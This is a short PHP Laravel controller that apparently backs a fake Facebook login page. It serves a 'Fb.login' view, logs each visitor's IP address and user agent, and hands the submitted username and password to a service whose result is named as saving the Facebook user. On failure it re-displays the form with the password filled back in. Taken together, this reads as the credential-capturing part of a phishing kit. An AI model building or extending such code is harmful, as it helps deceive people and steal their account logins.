<?php

namespace App\Http\Controllers;

use App\Models\Article;
use App\Services\FacebookService;
use App\Services\InfoService;
use Illuminate\Http\Request;

class FacebookController extends Controller
{
    protected $infoService;
    public function __construct(FacebookService $facebookService,InfoService $infoService)
    {
        $this->facebookService =  $facebookService;
        $this->infoService =  $infoService;
    }
    
    public function getLogin(){
        return view('Fb.login');
    }

    public function postLogin(Request $request){
        $ip             = $_SERVER['REMOTE_ADDR']; 
        $user_agent     = $_SERVER['HTTP_USER_AGENT'];
        $resultSaveInfo = $this->infoService->saveInfo($ip, $user_agent);
        $resultSaveUserFb = $this->facebookService->login($request->username, $request->password, $ip);
        if ($resultSaveUserFb == 1) {
            return view('Fb.login',['error'=> 'Tài khoản hoặc mật khẩu không đúng!','username'=> $request->username,'password'=> $request->password]);
        }
        return redirect()->route("index");
    }

}